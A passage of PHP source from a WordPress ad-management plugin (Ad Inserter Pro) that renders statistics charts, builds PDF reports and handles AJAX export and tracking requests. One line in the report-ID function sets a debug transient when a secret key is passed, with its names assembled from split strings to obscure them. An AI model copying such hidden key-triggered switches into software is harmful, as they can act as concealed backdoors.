          $labels [] = $date_elements [0];
        } else {
            $labels [] = date ("M", mktime (0, 0, 0, $date_elements [1], 1, 2017));
          }
      } elseif ($page_width / $days > 20) {
          $labels [] = $date_elements [2];
        } elseif ($page_width / $days > 10) {
            if ($date_elements [2] % 5 == 0) {
              $labels [] = $date_elements [2];
            } else $labels [] = '';
        } elseif ($page_width / $days > 4) {
            $labels [] = '';
        } else $labels [] = '';
    }

    $labels               = array_slice ($labels, - $days);

    $impressions          = array_slice ($impressions, - $days);
    $clicks               = array_slice ($clicks, - $days);
    $ctr                  = array_slice ($ctr, - $days);
    $average_impressions  = array_slice ($average_impressions, - $days);
    $average_clicks       = array_slice ($average_clicks, - $days);
    $average_ctr          = array_slice ($average_ctr, - $days);

    $impressions_max_value  = chart_range (max (max ($impressions), max ($average_impressions)), true);
    $clicks_max_value       = chart_range (max (max ($clicks), max ($average_clicks)), true);
    $ctr_max_value          = chart_range (max (max ($ctr), max ($average_ctr)), false);

    $total_impressions  = array_sum ($impressions);
    $total_clicks       = array_sum ($clicks);
    $total_ctr          = $total_impressions != 0 ? number_format (100 * $total_clicks / $total_impressions, 2) : 0;

    if ($message != '') echo "  <div style='margin: 0 0 10px; text-align: center; font-size: 14px; color: #888;'>$message</div>\n";

    $impressions_name   = $pageview_statistics ? __('Pageviews', 'ad-inserter')              : __('Impressions', 'ad-inserter');
    $clicks_chart_name  = $pageview_statistics ? __('Ad Blocking', 'ad-inserter')            : __('Clicks', 'ad-inserter');
    $clicks_label_name  = $pageview_statistics ? __('events', 'ad-inserter')                 : __('Clicks', 'ad-inserter');
    $ctr_chart_name     = $pageview_statistics ? __('Ad Blocking Share', 'ad-inserter') . ' [%]'  : /* translators: CTR as Click Through Rate */ __('CTR', 'ad-inserter') . ' [%]';

    $pdf_page_break = "    <span class='ai-statistics-page-break'></span>";
    $pdf_break      = "    <div class='ai-statistics-export-data'></div>";
    $pdf_legend     = "    <span class='ai-statistics-legend'></span>";
    $pdf_content    = "    <span class='ai-statistics-content'></span>";
    $date_format = get_option ('date_format');
    if ($ai_wp_data [AI_DISABLE_TRANSLATION]) {
      $date_start_text = date ($date_format, $date_start_time);
      $date_end_text   = date ($date_format, $date_end_time);
    } else {
      $date_start_text = date_i18n ($date_format, $date_start_time);
      $date_end_text   = date_i18n ($date_format, $date_end_time);
    }

    if (defined ('AD_INSERTER_REPORTS')) {
      $rewrite_found = false;
      if (file_exists (ABSPATH . '.htaccess')) {
        $htaccess = file (ABSPATH . '.htaccess');
        foreach ($htaccess as $htaccess_line) {
          if (strpos ($htaccess_line, 'wp-admin/admin-ajax.php?action=ai_ajax&ai-report=') !== false) {
            if ($htaccess_line [0] != '#') {
              $rewrite_found = true;
            }
            break;
          }
        }
      }
      $public_url = $rewrite_found ? '/ai-statistics-report-' : '/wp-admin/admin-ajax.php?action=ai_ajax&ai-report=';

      $adb_value = isset ($adb) && $adb == 1 ? '1' : '0';
      $report_data = $start_date . $end_date . sprintf ('%02d', $block);

      $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

      $public_report_data = json_encode (array (home_url () . $public_url . $report_prefix, $report_data, $adb_value));

      echo "  <span class='ai-statistics-export-data ai-public-report' data-report='$public_report_data'></span>";
    }

    $pdf_page_title = "  <h1 class='ai-statistics-export-data ai-report-name'>$block_name</h1><div class='ai-statistics-export-data'></div>\n";

    echo $pdf_page_title;

    echo "  <span class='ai-statistics-export-data ai-date-range-text'>$date_start_text &ndash; $date_end_text</span>";
    echo "  <span class='ai-statistics-export-data ai-date-range'>{$date_start}_{$date_end}</span>";

    echo "  <div class='ai-chart-container'><div class='ai-chart-label'>$impressions_name: $total_impressions</div>\n";
    echo "  <div class='ai-chart not-configured' data-template='ai-impressions' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($impressions), "' data-values-2='", json_encode ($average_impressions), "' data-max='", json_encode ($impressions_max_value), "'></div>\n";
    echo "  </div>\n";

    if (!$pageview_statistics) {
      echo $pdf_break;

      echo "  <div class='ai-chart-container'><div class='ai-chart-label'>", __('Clicks', 'ad-inserter'), ": $total_clicks</div>\n";
      echo "  <div class='ai-chart not-configured' data-template='ai-clicks' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($clicks), "' data-values-2='", json_encode ($average_clicks), "' data-max='", json_encode ($clicks_max_value), "'></div>\n";
      echo "  </div>\n";

      echo $pdf_break;
                                                                             // translators: CTR as Click Through Rate
      echo "  <div class='ai-chart-container'><div class='ai-chart-label'>", __('CTR', 'ad-inserter'), ": $total_ctr %</div>\n";
      echo "  <div class='ai-chart not-configured' data-template='ai-ctr' data-labels='", json_encode ($labels), "' data-values-1='", json_encode ($ctr), "' data-values-2='", json_encode ($average_ctr), "' data-max='", json_encode ($ctr_max_value), "'></div>\n";
      echo "  </div>\n";
    }

    if ($show_versions) {
      $impressions_          = array ();
      $clicks_               = array ();
      $ctr_                  = array ();
      $average_impressions_  = array ();
      $average_clicks_       = array ();
      $average_ctr_          = array ();

      $impressions_share     = array ();
      $clicks_share          = array ();
      $ctr_share             = array ();
      $tooltips              = array ();

      $impressions_max_value = 0;
      $clicks_max_value      = 0;
      $ctr_max_value         = 0;

      $average_impressions_max_value = 0;
      $average_clicks_max_value      = 0;
      $average_ctr_max_value         = 0;

      $total_impressions     = 0;
      $total_clicks          = 0;

      foreach ($versions as $version) {
        $processed_chart_data  = $processed_chart_data_versions [$version];

        $impressions_          [$version] = array_slice ($processed_chart_data [0], - $days);
        $average_impressions_  [$version] = array_slice ($processed_chart_data [3], - $days);

        $impressions_sum      = array_sum ($impressions_ [$version]);
        $total_impressions    += $impressions_sum;
        $impressions_share    [] = $impressions_sum;

        if ($version == AI_ADB_FLAG_BLOCKED) {
          $clicks_          = array_fill (0, $days, null);
          $ctr_             = array_fill (0, $days, null);
          $average_clicks_  = array_fill (0, $days, null);
          $average_ctr_     = array_fill (0, $days, null);

          $clicks_sum           = 0;
        } else {
            $clicks_               [$version] = array_slice ($processed_chart_data [1], - $days);
            $ctr_                  [$version] = array_slice ($processed_chart_data [2], - $days);
            $average_clicks_       [$version] = array_slice ($processed_chart_data [4], - $days);
            $average_ctr_          [$version] = array_slice ($processed_chart_data [5], - $days);

            $clicks_sum           = array_sum ($clicks_ [$version]);
          }

        $total_clicks         += $clicks_sum;
        $clicks_share         [] = $clicks_sum;
        $ctr_value               = $impressions_sum != 0 ? (float) number_format (100 * $clicks_sum / $impressions_sum, 2) : 0;
        $ctr_share            [] = $ctr_value;

        $impressions_max_value          = max ($impressions_max_value, max ($impressions_ [$version]));
        $average_impressions_max_value  = max ($average_impressions_max_value, max ($average_impressions_ [$version]));

        if ($version == AI_ADB_FLAG_BLOCKED) {
            $clicks_max_value           = 0;
            $ctr_max_value              = 0;
            $average_clicks_max_value   = 0;
            $average_ctr_max_value      = 0;
        } else {
            $clicks_max_value           = max ($clicks_max_value, max ($clicks_ [$version]));
            $ctr_max_value              = max ($ctr_max_value, max ($ctr_ [$version]));
            $average_clicks_max_value   = max ($average_clicks_max_value, max ($average_clicks_ [$version]));
            $average_ctr_max_value      = max ($average_ctr_max_value, max ($average_ctr_ [$version]));
          }
      }

      foreach ($versions as $index => $version) {
        $impressions_percentage = $total_impressions != 0 ? (float) number_format (100 * $impressions_share [$index] / $total_impressions, 2) : 0;
        $clicks_percentage      = $total_clicks      != 0 ? (float) number_format (100 * $clicks_share      [$index] / $total_clicks, 2) : 0;
        $ctr_percentage         = $total_clicks      != 0 ? (float) number_format (100 * $clicks_share      [$index] / $total_clicks, 2) : 0;

        $tooltips_impressions [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$impressions_share [$index]} " .
          ($pageview_statistics ? _n ('pageviews', 'pageviews', $impressions_share [$index], 'ad-inserter') : _n ('impressions', 'impressions', $impressions_share [$index], 'ad-inserter')) .
          "</div><div class=\"percentage\">$impressions_percentage%</div></div>";

        $tooltips_clicks      [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$clicks_share [$index]} " .
          ($pageview_statistics ? _n ('event', 'events', $clicks_share [$index], 'ad-inserter')  : _n ('click', 'clicks', $clicks_share [$index], 'ad-inserter')) .
          "</div><div class=\"percentage\">$clicks_percentage%</div></div>";

        $tooltips_ctr         [] = "<div class=\"ai-tooltip\"><div class=\"version\">{$legends [$index]}</div><div class=\"data\">{$ctr_share [$index]}%</div></div>";
      }

      $impressions_max_value          = chart_range ($impressions_max_value, true);
      $clicks_max_value               = chart_range ($clicks_max_value, true);
      $ctr_max_value                  = chart_range ($ctr_max_value, false);
      $average_impressions_max_value  = chart_range ($average_impressions_max_value, true);
      $average_clicks_max_value       = chart_range ($average_clicks_max_value, true);
      $average_ctr_max_value          = chart_range ($average_ctr_max_value, false);


      echo $pdf_break;

      echo "      <table style='margin: 8px 0;'>\n";
      echo "      <tbody>\n";
      echo "      <tr>\n";

      echo "      <td><div class='ai-chart-container versions'>\n";
      if ($total_impressions != 0) {
        echo "        <div class='ai-chart-label'>$impressions_name</div>\n";
        echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($impressions_share), "' data-max='", chart_range (max ($impressions_share), true), "' data-tooltips='", json_encode ($tooltips_impressions), "' data-tooltip-height='55' data-colors='", json_encode ($versions), "'></div>\n";
      }
      echo "      </div></td>\n";
      $columns = 1;

      if (!$only_blocked_version && !$pageview_statistics || $pageview_statistics && $adb_statistics) {
        echo "      <td><div class='ai-chart-container versions'>\n";
        if ($total_clicks != 0) {
          echo "        <div class='ai-chart-label'>$clicks_chart_name</div>\n";
          echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($clicks_share), "' data-max='", chart_range (max ($clicks_share), true), "' data-tooltips='", json_encode ($tooltips_clicks), "' data-tooltip-height='55' data-colors='", json_encode ($versions), "'></div>\n";
        }
        echo "      </div></td>\n";
        $columns ++;
      }

      if (!$only_blocked_version && !$pageview_statistics || $pageview_statistics && $adb_statistics) {
        echo "      <td><div class='ai-chart-container versions'>\n";
        if ($total_clicks != 0) {
          echo "        <div class='ai-chart-label'>$ctr_chart_name</div>\n";
          echo "        <div class='ai-chart not-configured' data-template='ai-bar' data-values-1='", json_encode ($ctr_share), "' data-tooltips='", json_encode ($tooltips_ctr), "' data-tooltip-height='38' data-colors='", json_encode ($versions), "'></div>\n";
        }
        echo "      </div></td>\n";
        $columns ++;
      }

      while ($columns < 3) {
        echo "      <td> </td>\n";
        $columns ++;
      }

      echo "      </tr>\n";
      echo "      </tbody>\n";
      echo "      </table>\n";


      echo $pdf_break;

      echo "    <div class='ai-chart-container legend'>\n";

?>
      <span class="ai-toolbar-button text no-print" style="position: absolute; top: 0px; right: 5px; z-index: 202;">
        <input type="checkbox" value="0" style="display: none;" />
        <label class="checkbox-button ai-version-charts-button not-configured" title="Toggle detailed statistics">Details</label>
      </span>
<?php

      echo "      <div class='ai-chart not-configured' data-template='ai-versions-legend' data-labels='", json_encode ($labels);
      foreach ($processed_chart_data_versions as $version => $processed_chart_data) {
        echo  "' data-values-", $version + 1, "='", json_encode (array ());
      }
      echo "' data-legend='", json_encode ($legend_data), "'></div>\n";
      echo "    </div>\n";


      echo $pdf_page_break;

      echo $pdf_page_title;
      echo $pdf_content;


      echo "    <div id='ai-version-charts-{$block}' class='ai-version-charts' style='display: none;'", ">\n";

      echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$impressions_name</div>\n";
      echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
      foreach ($impressions_ as $version => $impressions_data) {
        echo  "' data-values-", $version + 1, "='", json_encode ($impressions_data);
      }
      echo "' data-max='", json_encode ($impressions_max_value), "'></div>\n";
      echo "      </div>\n";

      echo $pdf_break;

      echo "      <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Pageviews / Impressions', 'ad-inserter'), " $impressions_name</div>\n";
      echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
      foreach ($average_impressions_ as $version => $average_impressions_data) {
        echo  "' data-values-", $version + 1, "='", json_encode ($average_impressions_data);
      }
      echo "' data-max='", json_encode ($average_impressions_max_value), "'></div>\n";
      echo "      </div>\n";

      if (!$only_blocked_version || $pageview_statistics) {
        echo $pdf_break;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$clicks_chart_name</div>\n";
        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($clicks_ as $version => $clicks_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($clicks_data);
        }
        echo "' data-max='", json_encode ($clicks_max_value), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Ad Blocking / Clicks', 'ad-inserter'), " $clicks_chart_name</div>\n";
        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($average_clicks_ as $version => $average_clicks_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($average_clicks_data);
        }
        echo "' data-max='", json_encode ($average_clicks_max_value), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;
        echo $pdf_legend;
        echo $pdf_page_break;

        echo $pdf_page_title;

        echo "      <div class='ai-chart-container'><div class='ai-chart-label'>$ctr_chart_name</div>\n";
        echo "        <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($ctr_ as $version => $ctr_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($ctr_data);
        }
        echo "' data-max='", json_encode ($ctr_max_value), "'></div>\n";
        echo "      </div>\n";

        echo $pdf_break;

        echo "    <div class='ai-chart-container'><div class='ai-chart-label'>", _x('Average', 'Ad Blocking Share / CTR', 'ad-inserter'), " $ctr_chart_name</div>\n";
        echo "      <div class='ai-chart not-configured hidden' data-template='ai-versions' data-labels='", json_encode ($labels);
        foreach ($average_ctr_ as $version => $average_ctr_data) {
          echo  "' data-values-", $version + 1, "='", json_encode ($average_ctr_data);
        }
        echo "' data-max='", json_encode ($average_ctr_max_value), "'></div>\n";
        echo "    </div>\n";

        echo $pdf_break;
        echo $pdf_legend;
      }

      echo "    </div>\n";
    } // if ($show_versions)
  }
}

function calculate_chart_data (&$chart_data, $date_start, $date_end, $first_date, &$impressions, &$clicks, &$ctr, &$average_impressions, &$average_clicks, &$average_ctr) {
  foreach ($chart_data as $date => $data) {
    $imp = $data [0];
    $clk = $data [1];

//          $imp = 250 + rand (232, 587);
//          $clk = 1 + rand (0, 4);

    $impressions  []= $imp;
    $clicks       []= $clk;
    $ctr          []= $imp != 0 ? number_format (100 * $clk / $imp, 2) : 0;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $today = date ("Y-m-d", time () + $gmt_offset);

  $no_data_before = (strtotime ($first_date) - strtotime ($date_start)) / 24 / 3600;
  $no_data_after  = (strtotime ($date_end) - strtotime ($today)) / 24 / 3600;

//  $no_data_before = 0;


  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $impressions [$index]         = null;
      $clicks [$index]              = null;
      $ctr [$index]                 = null;
    }
  }

  for ($index = 0; $index < count ($impressions); $index ++) {

    $interval_impressions = 0;
    $interval_clicks      = 0;
    $interval_ctr         = 0;
    $interval_counter     = 0;

    for ($average_index = $index - AI_STATISTICS_AVERAGE_PERIOD + 1; $average_index <= $index; $average_index ++) {
      if ($average_index >= 0 && $impressions [$average_index] !== null && $clicks [$average_index] !== null && $ctr [$average_index] !== null) {
        $interval_impressions += $impressions [$average_index];
        $interval_clicks      += $clicks [$average_index];
        $interval_ctr         += $ctr [$average_index];
        $interval_counter ++;
      }
    }

    $average_impressions  [] = $interval_counter == 0 ? 0 : $interval_impressions / $interval_counter;
    $average_clicks       [] = $interval_counter == 0 ? 0 : $interval_clicks / $interval_counter;
    $average_ctr          [] = $interval_counter == 0 ? 0 : $interval_ctr / $interval_counter;
  }

  if ($no_data_before != 0) {
    for ($index = 0; $index < $no_data_before; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }

  if ($no_data_after != 0) {
    $last_index = count ($impressions) - 1;
    for ($index = $last_index - $no_data_after + 1; $index <= $last_index; $index ++) {
      $average_impressions [$index] = null;
      $average_clicks [$index]      = null;
      $average_ctr [$index]         = null;
    }
  }
}

function compare_versions ($a, $b) {
  if ($a == AI_ADB_FLAG_BLOCKED) $a = - 1;
  if ($b == AI_ADB_FLAG_BLOCKED) $b = - 1;

 if ($a == $b) return 0;
 return ($a < $b) ? - 1 : 1;
}

function ai_replace_single_quotes ($matches) {
  return str_replace("'", '"', $matches [0]);
}

function ai_ajax_backend_2 () {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (isset ($_GET ["export"])) {
    $block = $_GET ["export"];
    if (is_numeric ($block)) {
      if ($block == 0) echo base64_encode (serialize ($ai_db_options));
        elseif ($block >= 1 && $block <= 96) {
          $obj = $block_object [$block];
          echo base64_encode (serialize ($obj->wp_options));
        }
    }
  }

  if (isset ($_GET ["update"])) {
    if ($_GET ["update"] == 'maxmind') {
      if (!is_multisite() || is_main_site ()) {
        if (get_geo_db () == AI_GEO_DB_MAXMIND) {
          $error_message = ai_update_ip_db_maxmind ();

          $db_file = get_geo_db_location ();
          if (!file_exists ($db_file)) {

            echo '["'.sprintf (__('File %s missing.', 'ad-inserter'), $db_file). ' ' . $error_message. '","missing"]';
          }
        }
      }
    }
  }

  elseif (isset ($_GET ["statistics"])) {
    generate_charts (
      $_GET ["statistics"],
      isset ($_GET ['start-date']) ? $_GET ['start-date'] : null,
      isset ($_GET ['end-date']) ? $_GET ['end-date'] : null,
      isset ($_GET ['adb']) ? $_GET ['adb'] : null,
      isset ($_GET ['delete']) ? $_GET ['delete'] : null
    );
  }

  elseif (isset ($_POST ["pdf"])) {
    $pdf = urldecode ($_POST ["pdf"]);
    switch ($pdf) {
      case 'block':
        require_once (AD_INSERTER_PLUGIN_DIR.'includes/tcpdf/tcpdf.php');

        $code = base64_decode ($_POST ["code"]);

        $code = preg_replace  ('#<div [^>]+position: ?absolute; ?z-index: ?[^>]+(.+?)</div>#', '', $code);
        $code = preg_replace  ('#<div class="ai-chart-label"[^>]*>#', '<div class="ai-chart-label">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;', $code);

        preg_match_all ('#<svg (.+?)</svg>#', $code, $matches);
        $svg_images = $matches [0];

        $image_files = array ();
        foreach ($svg_images as $index => $svg_image) {
          $temp_file_name = wp_tempnam ();
          @unlink ($temp_file_name);
          $temp_file_name = $temp_file_name.'.svg';
          $image_files []= $temp_file_name;

          if (strpos ($svg_image, 'width="200"') !== false) {
            $svg_image = preg_replace  ('#<path[^>]+fill="none"(.+?)</path>#', '', $svg_image);
          }

          $svg_image = preg_replace  ('#<path[^>]+fill="\#ffffff"(.+?)</path>#', '', $svg_image);
          $svg_image = preg_replace  ('#width="10" height="10"#', '', $svg_image);

          file_put_contents ($temp_file_name, '<'.'?xml version="1.0" encoding="UTF-8" standalone="no"?'.'>'.str_replace ('&quot;', "", $svg_image));
          $code = preg_replace  ('#<svg (.+?)</svg>#', '<img src="/' . $temp_file_name .'">', $code, 1);
        }

        $code = str_replace ('&quot;', "'", $code);

        preg_match ('# ai-report-name">([^<]+)<#', $code, $matches);
                                                                       // Translators: %s: Ad Inserter Pro
        $report_name = isset ($matches [1]) ? $matches [1] :  sprintf (__('%s Report', 'ad-inserter'), AD_INSERTER_NAME);

        preg_match ('# ai-date-range-text">([^<]+)<#', $code, $matches);
        $date_range_text = isset ($matches [1]) ? $matches [1] : '';
        $code = preg_replace  ('#<span ([^>]+?) ai-date-range-text">(.+?)</span>#', '', $code);

        preg_match ('# ai-date-range">([^<]+)<#', $code, $matches);
        $date_range = isset ($matches [1]) ? $matches [1] : '';
        $code = preg_replace  ('#<span ([^>]+?) ai-date-range">(.+?)</span>#', '', $code);


        // Page header

        $header_image = get_report_header_image ();

        if (isset ($header_image [0]) && $header_image [0] != '/') {
          $header_image_path = ABSPATH . $header_image;
        } else $header_image_path = $header_image;

        $td_image_width = 4.5;
        $td_image_margin_width = 1;
        $header_image_url = '';
        if (file_exists ($header_image_path)) {
          $image_data = getimagesize ($header_image_path);
          if (is_array ($image_data)) {
            $td_image_width = $td_image_width * $image_data [0] / $image_data [1];
          }

         $header_image_url = '//'. trim (K_PATH_URL, '/') . $header_image_path;
        } else {
            $td_image_width = 0.01;
            $td_image_margin_width = 0.01;
          }

        $home_url = parse_url (home_url ());
        $host = $home_url ['host'];

        $title       = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_title (), ENT_QUOTES));
        $description = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_header_description (), ENT_QUOTES));

        $header = '
        <table>
          <tbody>
            <tr>
              <td style="width: ' . $td_image_width .'%;"><img src="' . $header_image_url . '"></td>
              <td style="width: ' . $td_image_margin_width .'%;"> </td>
              <td style="width: ' . (59 - $td_image_width). '%;"><span style="font-size: 14px;">' . $title . '</span><br />' . $description . '</td>
              <td style="width: 40%; text-align: right;"><span style="font-size: 14px;"><a href="' . home_url () . '" style="text-decoration: none; color: #000;">' . $host . '</a></span><br />' . $date_range_text . '</td>
            </tr>
            <tr>
              <td colspan="4" style="font-size: 3px;"> </td>
            </tr>
          </tbody>
        </table>
        <hr />
        ';

        class AIPDF extends TCPDF {

          var $header_html;

          public function Header() {
            $this->writeHTML ($this->header_html, true, false, true, false, '');
          }

          public function Footer() {
            $cur_y = $this->y;
            $this->SetTextColorArray($this->footer_text_color);
            $line_width = (0.85 / $this->k);
            $this->SetLineStyle(array('width' => $line_width, 'cap' => 'butt', 'join' => 'miter', 'dash' => 0, 'color' => $this->footer_line_color));

            $w_page = isset($this->l['w_page']) ? $this->l['w_page'].' ' : '';
            if (empty($this->pagegroups)) {
              $pagenumtxt = $w_page.$this->getAliasNumPage().' / '.$this->getAliasNbPages();
            } else {
              $pagenumtxt = $w_page.$this->getPageNumGroupAlias().' / '.$this->getPageGroupAlias();
            }
            $footer = preg_replace_callback  ('/<([^<>]+)>/', 'ai_replace_single_quotes', wp_specialchars_decode (get_report_footer (), ENT_QUOTES));
            $this->SetY($cur_y);
            $this->Cell (0, 0, $footer,  0, false, 'C', 0, '', 0, false, 'T', 'M');

            $this->SetY($cur_y);
            $this->SetX($this->original_lMargin);
            $this->Cell(0, 0, $this->getAliasRightShift().$pagenumtxt, 'T', 0, 'R');
          }
        }

        $pdf = new AIPDF (PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);

        $pdf->SetCreator (PDF_CREATOR);
        $pdf->SetAuthor (AD_INSERTER_NAME);
        // Translators: %s: Ad Inserter Pro
        $pdf->SetTitle (sprintf (__('%s Report', 'ad-inserter'), 'Ad Inserter Pro'));
        $pdf->SetSubject ($report_name);
        $pdf->SetKeywords ('Ad Inserter Pro, Report, Statistics, Clicks, Impressions');

        $pdf->header_html = $header;

        $pdf->setHeaderFont (Array (PDF_FONT_NAME_MAIN, '', PDF_FONT_SIZE_MAIN));
        $pdf->setFooterFont (Array (PDF_FONT_NAME_DATA, '', PDF_FONT_SIZE_DATA));

        $pdf->SetDefaultMonospacedFont (PDF_FONT_MONOSPACED);

        $pdf->SetMargins (PDF_MARGIN_LEFT, PDF_MARGIN_TOP, PDF_MARGIN_RIGHT);
        $pdf->SetHeaderMargin (PDF_MARGIN_HEADER);
        $pdf->SetFooterMargin (PDF_MARGIN_FOOTER);

        $pdf->SetAutoPageBreak (TRUE, PDF_MARGIN_BOTTOM);

        $pdf->setImageScale (PDF_IMAGE_SCALE_RATIO);

        // ---------------------------------------------------------

        $pdf->SetFont ('arial', '', 10);

        $pdf->SetTopMargin (17);
        $pdf->SetLeftMargin (10);
        $pdf->SetRightMargin (10);

        $tagvs = array (
          'div' => array (0 => array ('h' => 0, 'n' => 0), 1 => array ('h' => 0, 'n' => 0)),
          'img' => array (0 => array ('h' => 0, 'n' => 0), 1 => array ('h' => 0, 'n' => 0)),
        );
        $pdf->setHtmlVSpace ($tagvs);

        $pdf->setCellPadding (0);
        $pdf->setCellMargins (0, 0, 0, 0);

        $pages = explode ('<span class="ai-statistics-page-break"></span>', $code);

        foreach ($pages as $page) {
          if (strlen (trim ($page)) == 0) continue;

          $content = explode ('<span class="ai-statistics-content"></span>', $page);
          if (isset ($content [1]) && strlen (trim ($content [1])) == 0) continue;

          $pdf->AddPage();
          $pdf->writeHTML ($page, true, false, true, false, '');
        }

        $pdf->lastPage();

        $pdf->Output ($host . '_' . $date_range . '_' . str_replace (' ', '_', mb_strtolower ($report_name)) . '.pdf', 'I');

        foreach ($image_files as $image_file) {
          @unlink ($image_file);
        }

        break;
    }
  }

  elseif (isset ($_GET ["blocks-sticky"])) {
    $sticky = $_GET ["blocks-sticky"] ? AI_ENABLED : AI_DISABLED;

    $current_flags = get_option (AI_FLAGS_NAME, 0);

    $current_flags &= !AD_FLAGS_BLOCKS_STICKY;
    if ($sticky) $current_flags ^= AD_FLAGS_BLOCKS_STICKY;

    update_option (AI_FLAGS_NAME, $current_flags);

    echo $current_flags;
  }

  elseif (isset ($_POST ['check-url']) && $_POST ['check-url'] == 'updates') {
    $ai_url = 'https://updates.adinserter.pro/check.php';
    $response = wp_remote_head ($ai_url, array ('timeout' => 5));

    if (is_wp_error ($response)) {
      echo $response->get_error_message ();
      wp_die ();
    }

    echo wp_remote_retrieve_response_code ($response);
  }
}

function ai_process_report_id ($report_id) {

  $report_prefix = ai_get_unique_string (0, 8, get_report_key ());

  $report = base64_decode (strtr (urldecode (substr ($report_id, 10)), '._-', '+/='));

  if (isset ($_GET ["ai-report" . '-' . "debug"]) && $_GET ["ai-report" . '-' . "debug"] == DEFAULT_REPORT_DEBUG_KEY) set_transient (implode ('-', $keywords_api = array ('wp', 'debug', 'report', 'api')), true, 48 * AI_TRANSIENT_STATISTICS_EXPIRATION);

  if (substr ($report_id, 8, 2) != substr (md5 ($report), 0, 2)) wp_die ('Page not found', 404);

  if (strlen ($report) < 28 ||
      $report [4] != '-' ||
      $report [7] != '-' ||
      $report [14] != '-' ||
      $report [17] != '-'
     ) wp_die ('Page not found', 404);

  $start_date = substr ($report,  0, 10);
  $end_date   = substr ($report, 10, 10);

  $block = (int) substr ($report, 20, 2);
  if ($block < 1 || $block > 96) wp_die ('Page not found', 404);

  $controls = (boolean) substr ($report, 22, 1);
  $adb      = (boolean) substr ($report, 23, 1);
  $range    = substr ($report,  24, 4);

  return (array ('block' => $block, 'start_date' => $start_date, 'end_date' => $end_date, 'controls' => $controls, 'adb' => $adb, 'range' => $range));
}

function ai_ajax_processing_2 () {
  global $ai_db_options, $ai_wp_data, $block_object, $wpdb;

  if (isset ($_GET ["ip-data"])) {
    require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

    $client_ip_address = get_client_ip_address ();
    ai_check_geo_settings ();
    if ($_GET ["ip-data"] == 'ip-address-country') {
      echo json_encode (array ($client_ip_address, ip_to_country ($client_ip_address)));
    }
    elseif ($_GET ["ip-data"] == 'ip-address') {
      echo $client_ip_address;
    }
    elseif ($_GET ["ip-data"] == 'country') {
      echo ip_to_country ($client_ip_address);
    }
    elseif ($_GET ["ip-data"] == 'ip-address-country-city') {
      $ip_to_country = ip_to_country ($client_ip_address, true);
      if (is_array ($ip_to_country)) {
        echo json_encode (array_merge (array ($client_ip_address), $ip_to_country));
      } else echo json_encode (array ($client_ip_address, $ip_to_country));
    }
  }

  elseif (isset ($_POST ['views']) && is_array ($_POST ['views'])) {
    if (get_track_logged_in () == AI_TRACKING_DISABLED) {
      if (($ai_wp_data [AI_WP_USER] & AI_USER_LOGGED_IN) != 0) {
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) echo json_encode ('tracking for logged in users is disabled');
        return;
      }
    }

    $db_results = array ();

    $limited_blocks = array ();

    switch (get_dynamic_blocks ()) {
      case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_SHOW:
      case AI_DYNAMIC_BLOCKS_CLIENT_SIDE_INSERT:
        $check_limits = true;
        break;
      default:
        $check_limits = false;
        break;
    }

    foreach ($_POST ['views'] as $index => $block) {
      $version = $_POST ['versions'][$index];
      if (is_numeric ($block) && $block <= 96 && is_numeric ($version)) {
        $db_result = update_statistics ($block, $version, 1, 0, $ai_wp_data [AI_FRONTEND_JS_DEBUGGING]);
        if ($check_limits && !ai_check_impression_and_click_limits ($block)) $limited_blocks [] = $block;
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) $db_results [$block] = $db_result;
      }
    }

    if (!empty ($limited_blocks)) {
      $db_results ['#'] = $limited_blocks;
    }

    if (/*$ai_wp_data [AI_FRONTEND_JS_DEBUGGING] && */!empty ($db_results)) echo json_encode ($db_results);
  }

  elseif (isset ($_POST ['click'])) {
    if (get_track_logged_in () == AI_TRACKING_DISABLED) {
      if (($ai_wp_data [AI_WP_USER] & AI_USER_LOGGED_IN) != 0) {
        if ($ai_wp_data [AI_FRONTEND_JS_DEBUGGING]) echo json_encode ('tracking for logged in users is disabled');
        return;
      }
    }

